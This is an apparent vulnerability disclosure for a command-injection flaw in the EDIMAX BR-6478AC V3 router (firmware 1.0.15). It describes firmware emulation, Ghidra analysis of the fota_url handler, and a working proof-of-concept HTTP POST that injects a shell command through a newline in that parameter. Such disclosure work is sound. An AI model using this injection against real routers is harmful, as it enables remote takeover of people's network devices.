# EDIMAX RCE
**description**: a remote-command-execution vulnerability was found on EDIMAX BR-6478AC V3 via the FUN_00416e24 function and systype in /bin/boa
## Firmware
**brand**:edimax   

**product**:AC1200 Wave 2 Dual-Band Gigabit Router   

**version**:BR-6478AC V3 1.0.15  

The firmware can be downloaded from this website[1] and using FirmAE to simulate the router environment.   
The command is 
```
sudo ./run.sh -d edimax ../Desktop/FIRWARE/BR-6478AC_v3_1.0.15.bin 
```
The result of the simulation is as follows: 
![alt text](images/simulation.png )
using ghidra we can know the action is formLtefotaUpgradeQuectel
![alt text](images/action.png)
and the relate web page is as follows and url of page is http://192.168.2.1/fota_quectel.htm:
![alt text](images/web.png)

## analyze
Using ghidra we can know that the post parameter "fota_url" will be sprintf as the first input parameter which will be executed
![alt text](images/analyze.png)
The details of the function as follows:

**addr**:00416ef8  
**function**: FUN_00416e24  
**parameter**:fota_url


# poc
Burp Suite change the packet as follows
```
POST /boafrm/formLtefotaUpgradeQuectel HTTP/1.1

Host: 192.168.2.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 86

Origin: http://192.168.2.1

Connection: close

Referer: http://192.168.2.1/fota_quectel.htm

Cookie: webuicookie=16041635651804289383

Upgrade-Insecure-Requests: 1



submit-url=%2Ffota_quectel.htm&fota_url=https%3A%2F%2F123\necho 123 > /tmp/poc_rce.txt
```
the result of POC is as follows, you can find the /tmp/poc_rce.txt was created after poc
![alt text](images/attack.png)

[1]:https://www.edimax.com/edimax/merchandise/merchandise_detail/data/edimax/global/home_legacy_wireless_routers/br-6478ac_v3
